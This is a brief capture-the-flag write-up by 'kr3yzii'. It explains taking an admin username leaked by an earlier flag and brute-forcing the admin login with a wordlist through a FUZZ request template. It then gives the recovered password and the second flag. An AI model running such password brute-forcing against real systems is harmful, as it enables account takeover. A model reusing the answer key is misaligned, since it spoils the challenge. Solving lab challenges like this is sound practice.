# Solution

Log in as admin, from first flag we will get the admin username:  ``"username":"brian.1954"``
Then bruteforce the password with wordlist given

```POST /admin/login
username=brian.1954&password=FUZZ
```
``password=dallas`` 

Flag #2 shown in admin dashboard

flag: ``flag{8a8b9661b3bd2baa2c74347a6c5cc0fc}``

Solved by: kr3yzii
